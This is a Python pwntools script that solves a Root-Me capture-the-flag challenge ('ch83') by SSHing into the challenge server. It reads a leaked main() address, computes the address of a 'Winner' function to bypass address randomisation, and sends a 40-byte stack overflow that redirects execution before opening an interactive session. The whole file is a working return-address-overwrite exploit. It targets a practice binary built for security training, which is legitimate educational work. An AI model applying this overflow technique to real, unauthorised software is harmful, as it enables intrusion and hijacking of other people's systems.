from pwn import *

elf = ELF("./ch83")

#p = gdb.debug(elf.path, '''
#    break main
#    continue
#''')

#p = process(elf.path)
shell = ssh(user="app-systeme-ch83",host='challenge03.root-me.org',password='app-systeme-ch83',port=2223)
p = shell.process('./ch83')
#p = gdb.debug(['./ch83'],ssh=shell,gdbscript='''
#    set sysroot
#    continue
#''')

p.recvuntil("main(): ")
data = p.recvline()[:-1]
main_addr = int(data.decode(),16)
Winner_addr = main_addr - elf.symbols['main'] + elf.symbols['Winner']
log.info("main_addr = " + hex(main_addr))
log.info("Winner_addr = " + hex(Winner_addr))
#print(p.recvuntil("Key: "))

buf = b"A"*40
buf += p64(Winner_addr)
p.send(buf)
p.interactive()
